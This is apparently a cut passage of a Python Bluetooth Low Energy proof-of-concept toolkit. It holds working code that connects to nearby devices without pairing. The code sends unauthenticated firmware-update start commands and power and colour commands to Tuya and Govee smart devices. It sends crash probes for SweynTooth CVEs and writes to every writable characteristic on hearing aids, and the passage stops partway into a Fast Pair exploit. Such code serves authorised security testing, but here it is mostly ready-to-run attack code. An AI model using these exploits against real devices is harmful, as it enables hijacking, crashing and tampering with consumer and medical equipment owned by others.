    if has_ti:     _log(log_cb, "[DFU] ✓ Texas Instruments OAD service detected   (ADV-DFU-003)")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[DFU] ✗ Connection failed")
                return []
            _log(log_cb, "[DFU] ✓ Connected (no pairing)")

            # ── Nordic DFU ────────────────────────────────────────────────────
            if has_nordic:
                _log(log_cb, "[DFU] ► Nordic DFU probe:")
                ctrl = _find_char(dev, _NORDIC_DFU_CTRL)
                pkt  = _find_char(dev, _NORDIC_DFU_PKT)

                received = []
                if ctrl and "notify" in ctrl.properties:
                    try:
                        await client.start_notify(ctrl.handle,
                            lambda _, d: received.append(bytes(d)))
                        _log(log_cb, "[DFU]   Subscribed to DFU Control Point notifications")
                    except Exception as e:
                        _log(log_cb, f"[DFU]   Subscribe error: {e}")

                # Send DFU Start command (op=0x01 = Start DFU, image type 0x04 = app)
                if ctrl:
                    ok = await _write(client, ctrl, bytes([0x01, 0x04]))
                    _log(log_cb, f"[DFU]   START DFU command → {'✓ ACCEPTED' if ok else '✗ rejected'}")
                    if ok:
                        results.append(_make_result(dev, _NORDIC_DFU_CTRL, payload=bytes([0x01,0x04])))
                        await asyncio.sleep(1.0)
                        if received:
                            _log(log_cb, f"[DFU]   Response: {received[-1].hex()} (op={received[-1][0]:#04x})")

                if pkt:
                    # Send 12-byte init packet header (size=0, zeros = probe only)
                    ok = await _write(client, pkt, bytes(12))
                    _log(log_cb, f"[DFU]   Packet char write → {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, _NORDIC_DFU_PKT, payload=bytes(12)))

                if ctrl and "notify" in ctrl.properties:
                    try:
                        await client.stop_notify(ctrl.handle)
                    except Exception:
                        pass

            # ── Silicon Labs OTA ───────────────────────────────────────────────
            if has_silabs:
                _log(log_cb, "[DFU] ► Silicon Labs OTA probe:")
                ctrl = _find_char(dev, _SILABS_OTA_CTRL)
                data = _find_char(dev, _SILABS_OTA_DATA)

                if ctrl:
                    # OTA Begin: write 0x00 to OTA Control
                    ok = await _write(client, ctrl, bytes([0x00]))
                    _log(log_cb, f"[DFU]   OTA BEGIN command → {'✓ ACCEPTED — unauthenticated OTA confirmed' if ok else '✗ rejected'}")
                    if ok:
                        results.append(_make_result(dev, _SILABS_OTA_CTRL, payload=bytes([0x00])))
                        # Immediately send OTA End (0x03) to avoid disrupting device
                        await _write(client, ctrl, bytes([0x03]))
                        _log(log_cb, "[DFU]   OTA END sent to restore device state")
                    if data:
                        _log(log_cb, f"[DFU]   OTA Data char accessible: {data.uuid}")

            # ── TI OAD ───────────────────────────────────────────────────────
            if has_ti:
                _log(log_cb, "[DFU] ► Texas Instruments OAD probe:")
                notify_char = _find_char(dev, _TI_OAD_NOTIFY)
                block_char  = _find_char(dev, _TI_OAD_BLOCK)

                received = []
                if notify_char and "notify" in notify_char.properties:
                    try:
                        await client.start_notify(notify_char.handle,
                            lambda _, d: received.append(bytes(d)))
                        _log(log_cb, "[DFU]   Subscribed to OAD Image Identify notifications")
                    except Exception as e:
                        _log(log_cb, f"[DFU]   Subscribe error: {e}")

                if notify_char:
                    # Send 8-byte OAD Image Identify header (all zeros = probe)
                    ok = await _write(client, notify_char, bytes(8))
                    _log(log_cb, f"[DFU]   OAD Image Identify → {'✓ ACCEPTED' if ok else '✗ rejected'}")
                    if ok:
                        results.append(_make_result(dev, _TI_OAD_NOTIFY, payload=bytes(8)))
                        await asyncio.sleep(1.0)
                        if received:
                            _log(log_cb, f"[DFU]   OAD response: {received[-1].hex()}")

                if notify_char and "notify" in notify_char.properties:
                    try:
                        await client.stop_notify(notify_char.handle)
                    except Exception:
                        pass

            if results:
                _log(log_cb, f"[DFU] ⚠ VULNERABLE — firmware update accepted without authentication!")
                _log(log_cb, f"[DFU]   An attacker could push arbitrary firmware to this device")
            else:
                _log(log_cb, "[DFU] ✓ DFU service present but all commands rejected (auth required or not in DFU mode)")

            _log(log_cb, f"[DFU] ✓ Probe complete — {len(results)} open DFU interactions")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "DFU", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "DFU", e)

    return results


# ── Tuya BLE control (ADV-TUYA-001) ──────────────────────────────────────────

_TUYA_SVC  = "00001910-0000-1000-8000-00805f9b34fb"
_TUYA_RECV = "00001911-0000-1000-8000-00805f9b34fb"  # notify (device → us)
_TUYA_SEND = "00001912-0000-1000-8000-00805f9b34fb"  # write  (us → device)


def _tuya_frame(seq: int, cmd: int, data: bytes) -> bytes:
    """Build a Tuya BLE protocol v3 frame."""
    body = struct.pack(">BBH", 0x03, seq & 0xFF, len(data)) + bytes([cmd]) + data
    head = bytes([0x55, 0xAA])
    payload = head + body
    chk = 0
    for b in payload:
        chk ^= b
    return payload + bytes([chk])


async def poc_tuya_control(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Tuya BLE unauth control PoC — ADV-TUYA-001.

    Sends device query + power toggle commands to the Tuya GATT service without
    any authentication. Many Tuya-based smart plugs, bulbs, and relays accept
    these commands from any nearby device.
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[TUYA] Unauth control PoC on {dev.mac} ({dev.name})")

    svc_uuids = {s.uuid.lower() for s in dev.services}
    if _TUYA_SVC not in svc_uuids:
        _log(log_cb, "[TUYA] ✗ Tuya service (0x1910) not found — device not Tuya-based")
        return []

    _log(log_cb, "[TUYA] ✓ Tuya service detected")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[TUYA] ✗ Connection failed")
                return []
            _log(log_cb, "[TUYA] ✓ Connected (no pairing)")

            # Resolve send/recv chars from live services if not pre-enumerated
            send_char = _find_char(dev, _TUYA_SEND)
            recv_char = _find_char(dev, _TUYA_RECV)

            if send_char is None:
                for svc in client.services:
                    for c in svc.characteristics:
                        if c.uuid.lower() == _TUYA_SEND:
                            send_char = GATTCharacteristic(c.uuid, c.handle, list(c.properties))
                        if c.uuid.lower() == _TUYA_RECV:
                            recv_char = GATTCharacteristic(c.uuid, c.handle, list(c.properties))

            if send_char is None:
                _log(log_cb, "[TUYA] ✗ Send characteristic not found")
                return []

            responses = []
            if recv_char:
                try:
                    await client.start_notify(recv_char.handle,
                        lambda _, d: responses.append(bytes(d)))
                    _log(log_cb, "[TUYA] ✓ Subscribed to response notifications")
                except Exception as e:
                    _log(log_cb, f"[TUYA]   Notify subscribe error: {e}")

            commands = [
                ("Device Query",  _tuya_frame(1, 0x00, b"")),
                ("Device Info",   _tuya_frame(2, 0x01, b"")),
                ("Power ON",      _tuya_frame(3, 0x06, bytes([0x01, 0x01, 0x00, 0x01, 0x01]))),
                ("Power OFF",     _tuya_frame(4, 0x06, bytes([0x01, 0x01, 0x00, 0x01, 0x00]))),
                ("Power ON",      _tuya_frame(5, 0x06, bytes([0x01, 0x01, 0x00, 0x01, 0x01]))),
            ]

            for label, frame in commands:
                ok = await _write(client, send_char, frame)
                _log(log_cb, f"[TUYA]   {label} → {'✓' if ok else '✗'}  ({frame.hex()})")
                if ok:
                    results.append(_make_result(dev, send_char.uuid, payload=frame))
                await asyncio.sleep(0.6)
                if responses:
                    _log(log_cb, f"[TUYA]   Response: {responses[-1].hex()}")
                    results.append(_make_result(dev, _TUYA_RECV, response=responses[-1]))
                    responses.clear()

            if recv_char:
                try:
                    await client.stop_notify(recv_char.handle)
                except Exception:
                    pass

            if results:
                _log(log_cb, f"[TUYA] ⚠ VULNERABLE — device accepted commands without authentication!")
            _log(log_cb, f"[TUYA] ✓ Done — {len(results)} interactions")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "TUYA", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "TUYA", e)

    return results


# ── Govee smart device control (CVE-2020-7958) ───────────────────────────────

_GOVEE_SVC  = "00010203-0405-0607-0809-0a0b0c0d1910"
_GOVEE_CTRL = "00010203-0405-0607-0809-0a0b0c0d2b11"


def _govee_cmd(cmd: int, params: bytes) -> bytes:
    """Build a 20-byte Govee command frame with XOR checksum."""
    frame = bytearray(20)
    frame[0] = 0x33
    frame[1] = cmd
    for i, b in enumerate(params):
        if i + 2 < 19:
            frame[i + 2] = b
    chk = 0
    for b in frame[:19]:
        chk ^= b
    frame[19] = chk
    return bytes(frame)


async def poc_govee_control(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Govee smart device unauth control PoC — CVE-2020-7958.

    Sends ON/OFF/color commands to Govee smart lights, strips, and sensors
    without any authentication. Any device in BLE range can control them.
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[GOVEE] Unauth control PoC on {dev.mac} ({dev.name})")

    svc_uuids = {s.uuid.lower() for s in dev.services}
    if _GOVEE_SVC not in svc_uuids and _GOVEE_CTRL not in {c.uuid.lower() for c in dev.all_characteristics()}:
        _log(log_cb, "[GOVEE] ✗ Govee service not found")
        return []

    _log(log_cb, "[GOVEE] ✓ Govee service detected")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[GOVEE] ✗ Connection failed")
                return []
            _log(log_cb, "[GOVEE] ✓ Connected (no pairing)")

            ctrl = _find_char(dev, _GOVEE_CTRL)
            if ctrl is None:
                for svc in client.services:
                    for c in svc.characteristics:
                        if c.uuid.lower() == _GOVEE_CTRL:
                            ctrl = GATTCharacteristic(c.uuid, c.handle, list(c.properties))
                            break
                    if ctrl:
                        break

            if ctrl is None:
                _log(log_cb, "[GOVEE] ✗ Control characteristic not found")
                return []

            _log(log_cb, f"[GOVEE] ✓ Control char: {ctrl.uuid}")

            # Govee command set (cmd byte, params, label)
            sequence = [
                (0x01, bytes([0x01]),             "Power ON"),
                (0x05, bytes([0x0D, 0xFF,0x00,0x00]), "Set Red"),
                (0x05, bytes([0x0D, 0x00,0xFF,0x00]), "Set Green"),
                (0x05, bytes([0x0D, 0x00,0x00,0xFF]), "Set Blue"),
                (0x04, bytes([0x64]),              "Brightness 100%"),
                (0x05, bytes([0x0D, 0xFF,0xFF,0xFF]), "Set White"),
                (0x01, bytes([0x00]),              "Power OFF"),
                (0x01, bytes([0x01]),              "Power ON"),
            ]

            for cmd_byte, params, label in sequence:
                frame = _govee_cmd(cmd_byte, params)
                ok = await _write(client, ctrl, frame)
                _log(log_cb, f"[GOVEE]   {label:20s} → {'✓' if ok else '✗'}  ({frame.hex()[:20]}...)")
                if ok:
                    results.append(_make_result(dev, ctrl.uuid, payload=frame))
                await asyncio.sleep(0.5)

            if results:
                _log(log_cb, f"[GOVEE] ⚠ VULNERABLE — Govee device fully controllable without authentication!")
            _log(log_cb, f"[GOVEE] ✓ Done — {len(results)} commands sent")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "GOVEE", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "GOVEE", e)

    return results


# ── MiBeacon advertisement decoder (ADV-MIBEACON-001) ────────────────────────

_MIBEACON_OBJECTS = {
    0x0410: ("Temperature",    lambda v: f"{struct.unpack_from('<h', v)[0] / 10:.1f}°C"   if len(v) >= 2 else v.hex()),
    0x0610: ("Humidity",       lambda v: f"{struct.unpack_from('<H', v)[0] / 10:.1f}%"   if len(v) >= 2 else v.hex()),
    0x0A10: ("Battery",        lambda v: f"{v[0]}%"                                        if v else v.hex()),
    0x0D10: ("Temp+Humidity",  lambda v: (
                                f"{struct.unpack_from('<h', v[:2])[0]/10:.1f}°C  "
                                f"{struct.unpack_from('<H', v[2:4])[0]/10:.1f}%") if len(v) >= 4 else v.hex()),
    0x1010: ("Formaldehyde",   lambda v: f"{struct.unpack_from('<H', v)[0] / 100:.3f} mg/m³" if len(v) >= 2 else v.hex()),
    0x0210: ("Motion",         lambda v: "motion detected"),
    0x0510: ("Switch",         lambda v: ("on" if v[0] else "off")                         if v else v.hex()),
    0x0910: ("Conductivity",   lambda v: f"{struct.unpack_from('<H', v)[0]} µS/cm"         if len(v) >= 2 else v.hex()),
    0x0810: ("Soil Moisture",  lambda v: f"{v[0]}%"                                        if v else v.hex()),
    0x1310: ("Illuminance",    lambda v: f"{struct.unpack_from('<I', v + bytes(1))[0] if len(v)==3 else 0} lux"),
    0x0110: ("Lock",           lambda v: f"state=0x{v.hex()}"),
    0x0B10: ("Light",          lambda v: ("on" if v[0] else "off")                         if v else v.hex()),
}

_MIBEACON_UUID = "0000fe95-0000-1000-8000-00805f9b34fb"


async def poc_mibeacon_decode(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    MiBeacon advertisement data disclosure — ADV-MIBEACON-001.

    Decodes and displays sensor data broadcast unencrypted in MiBeacon v1-v3
    advertisement frames.  No connection required — data is already captured in
    dev.service_data during passive scanning.

    Demonstrates that temperature, humidity, battery, motion and other sensor
    readings are trivially eavesdropped and spoofable without any pairing.
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[MIBEACON] Data disclosure probe on {dev.mac} ({dev.name})")

    # Find MiBeacon service data (key 0xFE95 in manufacturer_data or service_data)
    raw = dev.service_data.get(_MIBEACON_UUID) or dev.service_data.get("0000fe95-0000-1000-8000-00805f9b34fb")
    if raw is None:
        # Also check short UUID form
        for key, val in dev.service_data.items():
            if "fe95" in key.lower():
                raw = val
                break

    if raw is None:
        _log(log_cb, "[MIBEACON] ✗ No MiBeacon service data in advertisement — try rescanning")
        return []

    raw = bytes(raw)
    _log(log_cb, f"[MIBEACON] ✓ Raw frame: {raw.hex()}")

    if len(raw) < 5:
        _log(log_cb, "[MIBEACON] ✗ Frame too short to parse")
        return []

    frame_ctrl = struct.unpack_from("<H", raw, 0)[0]
    version      = (frame_ctrl >> 12) & 0x0F
    is_encrypted = bool(frame_ctrl & (1 << 3))
    has_mac      = bool(frame_ctrl & (1 << 4))
    has_object   = bool(frame_ctrl & (1 << 6))

    dev_type = struct.unpack_from("<H", raw, 2)[0]
    counter  = raw[4]

    _log(log_cb, f"[MIBEACON] ► Version:   {version}")
    _log(log_cb, f"[MIBEACON] ► Dev type:  0x{dev_type:04X}")
    _log(log_cb, f"[MIBEACON] ► Counter:   {counter}")
    _log(log_cb, f"[MIBEACON] ► Encrypted: {is_encrypted}")

    if is_encrypted:
        _log(log_cb, "[MIBEACON] ⚠ Frame is encrypted (MiBeacon v4+) — sensor data not directly readable")
        _log(log_cb, "[MIBEACON]   Device is still trackable via MAC address in advertisement")
        return []

    offset = 5
    if has_mac and len(raw) >= offset + 6:
        mac_bytes = raw[offset:offset + 6]
        adv_mac = ":".join(f"{b:02X}" for b in reversed(mac_bytes))
        _log(log_cb, f"[MIBEACON] ► MAC in frame: {adv_mac}")
        offset += 6

    if not has_object:
        _log(log_cb, "[MIBEACON] Frame has no object data — beacon-only frame")
        return []

    # Capability byte (optional, skip if present)
    if version >= 3 and offset < len(raw):
        offset += 1

    # Parse object records
    _log(log_cb, "[MIBEACON] ► Sensor data (broadcast without encryption):")
    while offset + 3 <= len(raw):
        obj_type = struct.unpack_from("<H", raw, offset)[0]
        obj_len  = raw[offset + 2]
        offset  += 3
        if offset + obj_len > len(raw):
            break
        obj_val = raw[offset:offset + obj_len]
        offset += obj_len

        if obj_type in _MIBEACON_OBJECTS:
            label, decoder = _MIBEACON_OBJECTS[obj_type]
            try:
                decoded = decoder(obj_val)
            except Exception:
                decoded = obj_val.hex()
            _log(log_cb, f"[MIBEACON]   {label:16s}: [bright_red]{decoded}[/]")
        else:
            _log(log_cb, f"[MIBEACON]   0x{obj_type:04X}        : {obj_val.hex()}")

        results.append(_make_result(dev, _MIBEACON_UUID, response=obj_val))

    if results:
        _log(log_cb, "[MIBEACON] ⚠ VULNERABLE — sensor data broadcast unencrypted and unauthenticated")
        _log(log_cb, "[MIBEACON]   Any nearby device can eavesdrop, replay, or spoof these readings")
    _log(log_cb, f"[MIBEACON] ✓ Done — {len(results)} data objects decoded")

    return results


# ── SweynTooth / BrakTooth crash probe ───────────────────────────────────────

_SWEYNTOOTH_CHIPS = {
    "nordic": ["nrf", "thingy", "nordic", "bbc micro", "microbit"],
    "cypress": ["cypress", "cyw", "psoc", "infineon", "bcm"],
    "esp32": ["esp32", "esp-", "atom", "m5stack", "tuya"],
    "telink": ["telink", "tlsr", "yeelight", "mipow", "milight"],
    "dialog": ["dialog", "da14", "renesas"],
}

_SWEYNTOOTH_CVES = {
    "nordic":  ["CVE-2019-16336", "CVE-2019-17517", "CVE-2019-17518", "CVE-2019-17519"],
    "cypress": ["CVE-2019-17520"],
    "esp32":   ["CVE-2021-28139", "CVE-2021-28135", "CVE-2021-28136"],
    "telink":  ["CVE-2019-17061"],
    "dialog":  ["CVE-2021-28137"],
}


def _detect_chip_family(dev: BTDevice) -> str | None:
    name_lower = (dev.name or "").lower()
    vendor_lower = (dev.vendor or "").lower()
    combined = name_lower + " " + vendor_lower
    for family, keywords in _SWEYNTOOTH_CHIPS.items():
        if any(kw in combined for kw in keywords):
            return family
    return None


async def poc_sweyntooth_probe(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    SweynTooth / BrakTooth GATT-level crash probe.

    SweynTooth vulnerabilities live in the BLE Link Layer, which can't be directly
    reached via standard GATT. This probe performs the closest possible tests:

      1. Chip family fingerprinting (Nordic/Cypress/ESP32/Telink/Dialog)
      2. MTU negotiation stress (request oversized MTU)
      3. ATT write with max payload to Nordic UART RX (triggers CVE-2019-17518)
      4. ATT request to an invalid handle (tests error handling — CVE-2021-28136)
      5. Rapid subscribe/unsubscribe cycling (tests state machine stability)
      6. Connection drop detection after each step

    A connection drop during any step is a strong crash indicator.
    Full LL-level testing requires specialized hardware (Ubertooth/nRF Sniffer).
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[SWEYN] SweynTooth/BrakTooth probe on {dev.mac} ({dev.name})")

    chip = _detect_chip_family(dev)
    if chip:
        cves = _SWEYNTOOTH_CVES.get(chip, [])
        _log(log_cb, f"[SWEYN] ✓ Chip family: [yellow]{chip.upper()}[/]")
        if cves:
            _log(log_cb, f"[SWEYN]   Potentially affected CVEs: {', '.join(cves)}")
    else:
        _log(log_cb, "[SWEYN] ℹ Chip family unknown — running generic stability probe")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[SWEYN] ✗ Connection failed")
                return []
            _log(log_cb, "[SWEYN] ✓ Connected")

            # ── Step 1: Request oversized MTU (512 bytes) ─────────────────────
            try:
                mtu = await asyncio.wait_for(client.get_services(), timeout=5.0)
                _log(log_cb, f"[SWEYN] ► MTU negotiation: OK")
            except Exception as e:
                _log(log_cb, f"[SWEYN]   Service discovery: {e}")

            # ── Step 2: Oversized write to Nordic UART RX (CVE-2019-17518) ───
            uart_rx = _find_char(dev, "6e400002-b5a3-f393-e0a9-e50e24dcca9e")
            if uart_rx and uart_rx.writable_without_auth:
                _log(log_cb, "[SWEYN] ► CVE-2019-17518: oversized ATT write to Nordic UART RX ...")
                oversized = bytes(512)  # well above typical ATT MTU of 23-247 bytes
                ok = await _write(client, uart_rx, oversized)
                if client.is_connected:
                    _log(log_cb, f"[SWEYN]   Write {'accepted' if ok else 'rejected'} — device [green]still alive[/]")
                else:
                    _log(log_cb, "[SWEYN]   ⚠ Device [bright_red]DISCONNECTED[/] after oversized write — crash likely!")
                    results.append(_make_result(dev, uart_rx.uuid, payload=oversized, success=True, error="crash_indicator"))
                    return results

            # ── Step 3: ATT request to invalid handle (CVE-2021-28136) ────────
            _log(log_cb, "[SWEYN] ► CVE-2021-28136: read from invalid ATT handle (0xFFFF) ...")
            try:
                await asyncio.wait_for(client.read_gatt_char(0xFFFF), timeout=3.0)
            except Exception:
                pass  # Error expected — we're checking if device survives
            if client.is_connected:
                _log(log_cb, "[SWEYN]   Invalid handle handled — device [green]still alive[/]")
            else:
                _log(log_cb, "[SWEYN]   ⚠ Device [bright_red]DISCONNECTED[/] after invalid handle — crash likely!")
                results.append(_make_result(dev, "0000ffff-0000-1000-8000-00805f9b34fb",
                                            success=True, error="crash_indicator"))
                return results

            # ── Step 4: Rapid notify subscribe/unsubscribe (state machine) ───
            notifiable = _open_chars(dev, "notify")
            if notifiable:
                _log(log_cb, f"[SWEYN] ► Rapid subscribe/unsubscribe cycle on {len(notifiable)} chars ...")
                for char in notifiable[:3]:
                    for _ in range(3):
                        try:
                            await client.start_notify(char.handle, lambda _, d: None)
                            await asyncio.sleep(0.1)
                            await client.stop_notify(char.handle)
                            await asyncio.sleep(0.05)
                        except Exception:
                            break
                if client.is_connected:
                    _log(log_cb, "[SWEYN]   Subscribe cycling — device [green]stable[/]")
                else:
                    _log(log_cb, "[SWEYN]   ⚠ Device [bright_red]DISCONNECTED[/] during subscribe cycling")
                    results.append(_make_result(dev, notifiable[0].uuid, success=True, error="crash_indicator"))
                    return results

            if results:
                _log(log_cb, f"[SWEYN] ⚠ Crash indicators detected — device likely vulnerable!")
            else:
                _log(log_cb, "[SWEYN] ✓ Device survived all probes")
                if chip:
                    _log(log_cb, f"[SWEYN]   Chip match means LL-layer risk still exists; full test needs nRF Sniffer")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "SWEYN", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "SWEYN", e)

    return results


# ── Medical hearing aid probe (CVE-2019-13473, CVE-2019-13474) ───────────────

_HEARING_AID_NAMES = ["signia", "siemens", "widex", "oticon", "phonak", "starkey",
                       "hearing", "resound", "bernafon", "unitron", "hansaton"]

async def poc_hearing_aid_probe(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Siemens/medical hearing aid unauth probe — CVE-2019-13473 / CVE-2019-13474.

    Hearing aids from Siemens (Signia), Widex, Oticon, and Phonak accept BLE
    connections without pairing and expose audio parameter characteristics.
    An attacker can read/write hearing profiles, volume levels, and EQ settings
    without user knowledge.
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[HEARING] Medical device probe on {dev.mac} ({dev.name})")

    name_lower = (dev.name or "").lower()
    if not any(kw in name_lower for kw in _HEARING_AID_NAMES):
        _log(log_cb, "[HEARING] ℹ Device name doesn't match known hearing aid patterns — proceeding anyway")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[HEARING] ✗ Connection failed")
                return []
            _log(log_cb, "[HEARING] ✓ Connected without pairing (CVE-2019-13473 confirmed)")

            results += await _read_device_info(dev, client, log_cb)

            # Read ALL open characteristics — hearing aids expose audio params
            _log(log_cb, "[HEARING] ► Reading all accessible characteristics:")
            for char in _open_chars(dev, "read"):
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"[HEARING]   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Attempt writes to all writable chars (CVE-2019-13474: config write)
            writable = _open_chars(dev, "write") + _open_chars(dev, "write-without-response")
            if writable:
                _log(log_cb, f"[HEARING] ► Probing {len(writable)} writable parameter char(s) (CVE-2019-13474):")
                for char in writable:
                    # Write a minimal safe value — just probe, don't set dangerous audio levels
                    ok = await _write(client, char, bytes([0x00]))
                    _log(log_cb, f"[HEARING]   WRITE 0x00 → {char.description or char.uuid}: {'✓ OPEN — audio params writable!' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=bytes([0x00])))

            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[HEARING] ► Subscribing to {len(notifiable)} notify chars (5s audio stream):")
                notified = []
                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle,
                            lambda _, d, c=char: notified.append((c.uuid, bytes(d))))
                        subscribed.append(char)
                    except Exception:
                        pass
                await asyncio.sleep(5.0)
                for mac, data in notified:
                    _log(log_cb, f"[HEARING]   NOTIFY {mac} ← {_decode(data)}")
                    results.append(_make_result(dev, mac, response=data))
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[HEARING] ⚠ Unauthenticated access confirmed — {len(results)} values read/written")
            _log(log_cb, "[HEARING]   An attacker could silently modify hearing profiles or mute the device")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "HEARING", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "HEARING", e)

    return results


# ── BlueBorne / BleedingTooth / BlueFrag detection report ─────────────────────

_BLUEBORNE_CVES = {
    "CVE-2017-1000251": ("CRITICAL", "Linux L2CAP RCE",          "Linux/Ubuntu/Raspberry Pi/Router"),
    "CVE-2017-1000250": ("HIGH",     "Linux BlueZ SDP Leak",     "Linux/BlueZ"),
    "CVE-2017-0781":    ("CRITICAL", "Android BNEP RCE",         "Android pre-8.0"),
    "CVE-2017-0782":    ("HIGH",     "Android BNEP InfoDisc",    "Android"),
    "CVE-2020-12351":   ("CRITICAL", "BleedingTooth L2CAP RCE",  "Linux kernel < 5.9"),
    "CVE-2020-12352":   ("HIGH",     "BleedingTooth InfoDisc",   "Linux kernel < 5.9"),
    "CVE-2020-0022":    ("CRITICAL", "BlueFrag Android RCE",     "Android 8.0/8.1"),
    "CVE-2019-8648":    ("CRITICAL", "Apple MagicPairing RCE",   "iOS/macOS/AirPods"),
    "CVE-2022-30190":   ("HIGH",     "Windows BT L2CAP DoS",     "Windows 10/11"),
    "CVE-2024-21306":   ("HIGH",     "Windows BT HID RCE",       "Windows 10/11"),
}


async def poc_blueborne_info(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    BlueBorne / BleedingTooth / BlueFrag / Apple detection report.

    These vulnerabilities operate at the Classic BT L2CAP/HCI layer and cannot
    be triggered via standard GATT (bleak).  Full exploitation requires custom
    radio firmware (Ubertooth, nRF Sniffer) or a patched BlueZ host stack.

    This PoC:
      - Identifies which CVEs apply to this device from matched_vulns
      - Probes Classic BT reachability (l2ping)
      - Reports exact attack surface and remediation for each matched CVE
      - Tries a basic L2CAP connection to confirm Classic BT reachability
    """
    import subprocess

    results: list[WriteResult] = []
    _log(log_cb, f"[BLUEBORNE] Classic BT vulnerability report for {dev.mac} ({dev.name})")

    matched_ids = {v.cve_id for v in dev.matched_vulns}
    relevant = {cid: info for cid, info in _BLUEBORNE_CVES.items() if cid in matched_ids}

    if not relevant:
        _log(log_cb, "[BLUEBORNE] ✗ No BlueBorne/BleedingTooth CVEs matched for this device")
        return []

    _log(log_cb, f"[BLUEBORNE] ✓ {len(relevant)} CVE(s) matched:")
    for cve_id, (severity, name, affects) in relevant.items():
        sev_color = {"CRITICAL": "bright_red", "HIGH": "red", "MEDIUM": "yellow"}.get(severity, "white")
        _log(log_cb, f"[BLUEBORNE]   [{sev_color}]{severity:8s}[/] {cve_id:20s} {name}")
        _log(log_cb, f"[BLUEBORNE]            Affects: {affects}")

    # ── Probe Classic BT reachability via l2ping ──────────────────────────────
    _log(log_cb, f"[BLUEBORNE] ► Testing Classic BT reachability (l2ping) ...")
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                "l2ping", "-c", "2", "-t", "4", dev.mac,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            ),
            timeout=10.0,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=12.0)
        if proc.returncode == 0:
            _log(log_cb, "[BLUEBORNE] ✓ Classic BT L2CAP reachable — device is in range and responding")
            _log(log_cb, "[BLUEBORNE] ⚠ Attack surface CONFIRMED — device is within exploitation range")
            results.append(_make_result(dev, "l2cap://classic", success=True))
        else:
            _log(log_cb, "[BLUEBORNE]   l2ping: no response (device may be BLE-only or not in range)")
    except FileNotFoundError:
        _log(log_cb, "[BLUEBORNE]   l2ping not found — install bluez-utils for Classic BT probing")
    except Exception as e:
        _log(log_cb, f"[BLUEBORNE]   l2ping error: {e}")

    # ── Remediation notes ──────────────────────────────────────────────────────
    _log(log_cb, "[BLUEBORNE] ► Remediation:")
    _log(log_cb, "[BLUEBORNE]   Linux targets: kernel >= 5.9 patches BleedingTooth; BlueZ >= 5.55 patches BlueBorne")
    _log(log_cb, "[BLUEBORNE]   Android:       security patch 2017-09 (BlueBorne) / 2020-02 (BlueFrag)")
    _log(log_cb, "[BLUEBORNE]   Windows:       KB5003637 / monthly security updates")
    _log(log_cb, "[BLUEBORNE]   iOS/macOS:     iOS 10.3.3 / macOS 10.12.6 (BlueBorne)")
    _log(log_cb, "[BLUEBORNE]   Full PoC:      github.com/ArmisSecurity/blueborne")
    _log(log_cb, f"[BLUEBORNE] ✓ Report complete — {len(results)} reachability confirmations")

    return results


# ── WhisperPair PoC (CVE-2025-36911) ─────────────────────────────────────────

# Google Fast Pair GATT UUIDs
_FP_SVC         = "0000fe2c-0000-1000-8000-00805f9b34fb"
_FP_KBP         = "fe2c1233-8366-4814-8eb0-01de32100bea"   # Key-Based Pairing char
_FP_PASSKEY     = "fe2c1234-8366-4814-8eb0-01de32100bea"
_FP_ACCOUNT_KEY = "fe2c1235-8366-4814-8eb0-01de32100bea"

# Zero-key (16 bytes): used when the device skips ECDH key validation
_ZERO_KEY = bytes(16)


def _aes_ecb_encrypt(key: bytes, data: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(key), modes.ECB())
    enc = c.encryptor()
    return enc.update(data) + enc.finalize()


def _aes_ecb_decrypt(key: bytes, data: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(key), modes.ECB())
    dec = c.decryptor()
    return dec.update(data) + dec.finalize()


